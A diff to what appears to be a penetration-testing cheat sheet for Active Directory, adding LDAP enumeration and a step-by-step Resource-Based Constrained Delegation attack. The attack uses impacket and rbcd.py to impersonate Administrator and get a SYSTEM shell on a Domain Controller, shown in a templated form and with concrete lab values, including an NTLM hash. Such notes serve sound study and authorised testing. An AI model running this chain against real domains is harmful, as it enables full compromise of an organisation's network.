@@ -108,6 +108,7 @@ enumdomusers
 ##### ldap
 ```bash
 ldapsearch -x -H ldap://<IP> -s base
+ldapsearch -x -H ldap://<IP> -b "DC=offsec,DC=local"
 ```
 </details>
 
@@ -306,8 +307,50 @@ net group "Management Department" stephanie /del /domain
 ```
 Typical Abuse Scenarios
 ```bash
-#If you have GenericAll over a user → Full account takeover.
+#If you have GenericAll over a user → Full account takeover. (Resourced PG)
 Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+
+# If you have GenericAll over a Domain Controller object
+# (or sufficient rights to modify msDS-AllowedToActOnBehalfOfOtherIdentity)
+→ Potential Full Domain Controller compromise via RBCD (Resource-Based Constrained Delegation)
+
+This attack allows impersonation of any user (including Administrator / SYSTEM)
+on the target Domain Controller if you can control or create a machine account.
+
+---
+
+# 1. Create or control a machine account in the domain
+impacket-addcomputer <domain>/<user>:<password> \
+-dc-ip <DC_IP> \
+-computer-name <FAKE_COMPUTER>$ \
+-computer-pass <PASSWORD>
+
+---
+
+# 2. Configure Resource-Based Constrained Delegation on the target (DC)
+rbcd.py -dc-ip <DC_IP> \
+-action write \
+-delegate-to <DC_NAME>$ \
+-delegate-from <FAKE_COMPUTER>$ \
+<domain>/<user>:<password>
+
+---
+
+# 3. Request service ticket (S4U2Self + S4U2Proxy)
+impacket-getST -spn cifs/<dc_fqdn> \
+<domain>/<fake_computer>$:<password> \
+-impersonate Administrator \
+-dc-ip <DC_IP>
+
+---
+
+# 4. Load the Kerberos ticket
+export KRB5CCNAME=<TICKET_FILE>.ccache
+
+---
+
+# 5. Execute commands on the Domain Controller as the impersonated user
+impacket-psexec -k -no-pass <dc_fqdn>
 
 #If you have GenericWrite over a user → Add fake SPN → Kerberoast.
 Set-ADUser -Identity websvc `
@@ -652,6 +695,39 @@ net group "Target Group" attacker /add /domain
 
 ---
 
+
+## If you have GenericAll over a Domain Controller object (or rights to modify delegation):
+**Case use: Full Domain Controller compromise via RBCD (Resource-Based Constrained Delegation)**
+RBCD requires:
+- Machine account creation OR control
+- msDS-AllowedToActOnBehalfOfOtherIdentity write permission
+Export Kerberos ticket:
+
+```bash
+export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+```
+Add target resolution (optional but common fix for name resolution issues):
+
+```bash
+echo "192.168.182.175 resourcedc.resourced.local resourcedc" | sudo tee -a /etc/hosts
+```
+Abuse RBCD by creating a machine account and delegating access:
+
+```bash
+sudo python3 rbcd.py -dc-ip 192.168.182.175 -action write -delegate-to RESOURCEDC$ -delegate-from griffyn$ -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 resourced.local/L.Livingstone
+```
+Request service ticket (S4U impersonation):
+```bash
+impacket-getST -spn cifs/resourcedc.resourced.local resourced/griffyn$:griffyn -impersonate Administrator -dc-ip 192.168.182.175
+```
+Use ticket:
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+Execute remote commands as SYSTEM:
+```bash
+impacket-psexec -k -no-pass resourcedc.resourced.local
+```
 # Quick Mental Model
 
 | Group | Scope | Risk Level |
